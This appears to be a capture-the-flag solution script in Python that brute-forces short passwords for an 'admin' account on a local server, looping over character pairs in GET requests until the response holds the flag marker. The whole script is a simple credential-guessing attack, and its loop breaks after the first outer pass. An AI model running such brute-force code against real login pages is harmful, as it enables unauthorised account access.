import requests

target = "http://localhost:9999/?username={}&password={}"

for i in range(33, 127):
    for j in range(75, 127):
        guess = chr(i) + chr(j)
        print(f"[+] Trying {guess}")

        url = target.format("admin", guess)

        response = requests.get(url)

        if "grifflesCTF{" in response.text:
            print(f"[+] Found flag in response:")
            print(response.text)
            break
    break
